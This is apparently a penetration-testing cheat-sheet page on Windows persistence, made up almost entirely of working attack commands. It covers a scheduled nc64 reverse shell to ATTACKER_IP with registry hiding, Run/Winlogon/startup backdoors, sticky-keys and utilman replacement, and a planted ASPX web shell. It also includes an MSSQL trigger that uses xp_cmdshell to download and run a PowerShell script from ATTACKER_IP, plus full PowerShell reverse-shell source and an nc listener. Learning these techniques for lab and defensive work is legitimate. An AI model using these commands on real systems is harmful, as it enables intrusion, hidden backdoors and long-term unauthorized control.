---
title: "Persistence"
tagName: persistence
search: exclude
permalink: act_persistence.html
sidebar: home_sidebar
toc: false
folder: act
---

## Any access, action or change to a system that gives an attacker persistent presence on the system.



Windows

Task Scheduler

Example backdoor (nc64) scheduled
schtasks /create /sc minute /mo 1 /tn <TASKNAME> /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM

Check it's running...
schtasks /query /tn thm-taskbackdoor
Hide the schedule!
Delete this key
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<TASKNAME>\SD

Startup folder

C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
or all users here:
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

Place your reverse shell script in here to be triggered on login


Run / RunOnce

HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

Add a new key with data pointing to your reverse shell.


Winlogon
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ 
For either of these keys
Userinit
shell

simply append a comma followed by your reverse shell or other script after the default executables.

Logon scripts
You can also place your script call in the script file mentioned here:
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit\UserInitMprLogonScript

If you have physical access...

The Sticky keys executable isn't used by most users, and can be replaced with a binary with more nefarious intentions...
C:\Windows\System32\sethc.exe
Then simply press the shift key 5 times to run the executable.

takeown /f c:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

Now when the machine is locked you can just press shift 5 times and get access

Utilman

takeown /f c:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe


Hiding persistence through existing services

Using Web Shells

https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
move shell.aspx C:\inetpub\wwwroot\

icacls shell.aspx /grant Everyone:F



http://MACHINE_IP/shell.aspx


Using MSSQL as a Backdoor

Run the following SQL
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
## Now allow any DB user to impersonate other DB users (admin for example)
USE master
GRANT IMPERSONATE ON LOGIN::sa to [Public];
# Now crete a trigger
USE HRDB
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';


$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
run a web server to serve your new script
python3 -m http.server 
2nd shell to receive the reverse shell.
nc -lvp 4454

Finally Trigger the trigger.




{% include taglogic.html %}

{% include links.html %}
